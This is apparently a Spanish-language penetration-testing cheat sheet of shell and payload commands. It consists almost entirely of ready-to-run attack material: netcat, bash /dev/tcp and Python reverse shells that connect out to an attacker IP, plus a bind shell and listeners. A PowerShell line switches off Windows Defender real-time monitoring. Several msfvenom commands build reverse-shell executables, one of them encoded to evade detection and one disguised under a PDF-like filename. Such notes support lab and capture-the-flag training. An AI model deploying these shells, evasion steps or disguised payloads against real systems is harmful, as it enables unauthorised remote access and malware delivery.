# Shells
## Reverse Shells

### Linux
#Maquina_victima 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc [IP] [Puerto] >/tmp/f
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Puerto]>/tmp/f
```

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [IP] [PUERTO] > /tmp/f
```

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([IP],[PUERTO]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
bash -c "sh -i >& /dev/tcp/[IP]/[PUERTO] 0>&1"
```

```
bash -i >& /dev/tcp/[IP]/[PUERTO] 0>&1
```

#Maquina_atacante 
```
nc -lvnp [PUERTO]
```

Si el firewall bloquea podemos usar el puerto 443 por ejemplo ya que este no suele estar bloqueado.
### Windows
#Maquina_victima_Windows 
```CMD
FILTRADO POR EL FIREWALL
```

#Maquina_atacante 
```
sudo nc -lvnp [PUERTO]
```

Si el firewall bloquea podemos usar el puerto 443 por ejemplo ya que este no suele estar bloqueado.

Si estamos en una maquina Windows podemos desactivarlo con:
```PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
```
### Metasploit

Para SMB tenemos el módulo `exploit/windows/smb/psexec`
## Bind Shells
Necesitas control total en ambas
#Maquina_victima 
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [IP_VICTIMA] [PUERTO] > /tmp/f
```

#Maquina_atacante 
```
nc -nv [IP_VICTIMA] [PUERTO]
```

# Payloads

## En Ambos
[Payloads All The Things ](https://github.com/swisskyrepo/PayloadsAllTheThings)
## Linux con MsfVenom
El comando para crearlo es:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP_KALI] LPORT=[PUERTO] -f [EXTENSION_QUE_QUEREMOS] > [NOMBRE_FINAL].[EXTENSION]
```

Para saber el tipo de payloads:
```
msfvenom -l payloads
```

Ejemplo:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

#Maquina_atacante 
```
nc -lvnp 443
```

#Maquina_victima 
Pasamos el archivo creado por MsfVenom y lo ejecutamos.

Ejemplo de una web Apache Tomcat:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.129.204.126 LPORT=443 -f war > shell.war
```

## Windows con MsfVenom
Ejemplo :
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.23.190 LPORT=1336 -f exe -o program.exe
```